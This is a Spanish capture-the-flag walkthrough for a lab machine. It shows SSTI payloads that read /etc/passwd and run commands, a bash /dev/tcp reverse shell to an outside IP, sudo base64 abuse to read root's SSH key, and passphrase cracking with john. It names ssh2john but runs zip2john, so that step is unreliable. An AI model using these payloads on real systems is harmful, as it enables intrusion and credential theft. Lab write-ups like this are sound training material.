PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

-En el puerto 80 hay un servidor default

-En el puerto 8089 hay un campo de texto. Lo que pongas en el input se refleja en la web como un output. También observamos con 'whatweb'  que el servidor está usando 'python' y la librería 'Werkzeug'. Todo esto es un claro indicador de que puede haber una vulnerabilidad 
**SSTI (Server Side Template Injection)**. 

-Para comprobar que estamos ante un SSTI hacemos lo siguiente:
	-La URL vulnerable: -http://verdejo:8089/?user=
	-Comprobación: -http://verdejo:8089/?user= {{7 * 7}}
		-Si sale el resultado = 49 en el output significa que es vulnerable
	-Respuesta del la web --> Hola 49 --> Confirmamos que es vulnerable a SSTI


-Nos vamos a **Payloadallthethings** y buscamos como explotarlo:
		**-Para leer un archivo interno de la máquina:**
			 -http://verdejo:8089/?user={{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
		**-Para RCE:** 
			-http://verdejo:8089/?user= {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
			**-Respuesta:** uid=1000(verde) gid=1000(verde) groups=1000(verde) 
		**-Nos entablamos una reverse shell:** 
			-http://verdejo:8089/?user= {{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/192.169.236.128/1234 0>%261'").read() }}


## Escalada de Privilegios

-Somos el usuario verde y podemos ejecutar el siguiente binario como root:
	(root) NOPASSWD: /usr/bin/base64
	-Nos permite leer cualquier archivo de la máquina

-Buscamos archivos y directorios que pertenezcan al usuario root, excluyendo directorios que no nos interesan:
	-find / -user root ! -path "/proc/a*" ! -path "/usr/a*" ! -path "/sys/a*" ! -path "/var/a*" 2>/dev/null
	-Vemos que en /etc/ssh puede haber archivos interesantes

-Vemos el contenido de la configuración de ssh:
	verde@8323e35fd744:/etc/ssh$ cat ssh_config
		IdentityFile ~/.ssh/id_rsa
		-Parece que las claves privadas ssh de los usuarios se guardan en esa ruta 

-Probamos a ver si existe esa ruta para el usuario root:
	-sudo base64 "/root/.ssh/id_rsa" | base64 --decode
	-Obtenemos la clave privada de root!!!

-La guardamos, le damos permisos y nos intentamos autenticar con ella por ssh:
	-ssh -i id_rsa_root root@172.17.0.2 
	Enter passphrase for key 'id_rsa_root': 
	-Nos pide una 'passphrase'

-Generamos un hash con ssh2john y lo rompemos con john para averiguar la 'passphrase':
	-zip2john id_rsa_root > hash.txt
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
		honda1           (id_rsa_root)   

-Nos autenticamos por ssh aportando la clave privada y la 'passphrase':
	-ssh -i id_rsa_root root@172.17.0.2
	-Enter passphrase for key 'id_rsa_root': honda1
	root@8323e35fd744:~# whoami
	root

